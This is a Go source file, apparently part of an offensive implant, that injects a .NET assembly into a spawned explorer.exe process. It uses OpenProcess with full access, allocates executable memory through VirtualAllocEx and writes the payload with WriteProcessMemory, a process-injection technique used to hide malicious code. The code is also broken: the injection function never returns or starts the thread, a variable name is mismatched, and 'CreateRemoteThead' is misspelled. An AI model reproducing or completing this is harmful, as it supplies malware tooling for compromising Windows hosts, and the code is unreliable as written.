package assembly

import (
	"bytes"
	"fmt"
	"os/exec"
	"strconv"
	"syscall"
	"unsafe"

	"../execute"
)

const (
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
)

var (
	kernel32      	   *syscall.DLL
	virtualAllocEx	   *syscall.Proc
	writeProcMem  	   *syscall.Proc
	createRemoteThread *syscall.Proc
)

func runAssembly(assembly string, clrAssembly string, timeout int) ([]byte, string, string) {
	proc := exec.Command("explorer.exe")
	var stdoutBuf, stderrBuf bytes.Buffer
	proc.Stdout = &stdoutBuf
	proc.Stderr = &stderrBuf

	err := proc.Start()
	if err != nil {
		return []byte(fmt.Sprintf("Encountered an error starting the process: %q", err.Error())), execute.ERROR_STATUS, execute.ERROR_PID
	}
	pid := proc.Process.Pid
	pidStr := strconv.Itoa(pid)
	procHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return []byte(fmt.Sprintf("Could not get process handle: %q", err.Error())), execute.ERROR_STATUS, pidStr
	}

	baseClrAddress, err := virtualAllocEx.Call(uintptr(procHandle), nil, uintptr(len(clrAssembly)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return []byte(fmt.Sprintf("Could not allocate memory for Base CLR Assembly: %q", err.Error())), execute.ERROR_STATUS, pidStr
	}

	var written bytes.Buffer
	memWrite, err := writeProcMem.Call(uintptr(procHandle), uintptr(baseClrAddress), uintptr(unsafe.Pointer(&clrAssembly)), uintptr(len(clrAssembly)), &written)
	if err != nil {
		return []byte{}, execute.ERROR_STATUS, pidStr
	}

}

func checkIfAvailable() bool {
	var kernel32Err, vAllocExErr, writeProcMemErr, remoteThreadErr error
	kernel32, kernel32Err = syscall.LoadDLL("kernel32.dll")
	virtualAlloc, vAllocExErr = kernel32.FindProc("VirtualAllocEx")
	writeProcMem, writeProcMemErr = kernel32.FindProc("WriteProcessMemory")
	createRemoteThread, remoteThreadErr = kernel32.FindProc("CreateRemoteThead")
	if kernel32Err == nil && vAllocExErr == nil && writeProcMemErr == nil && remoteThreadErr == nil {
		return true
	}
	return false
}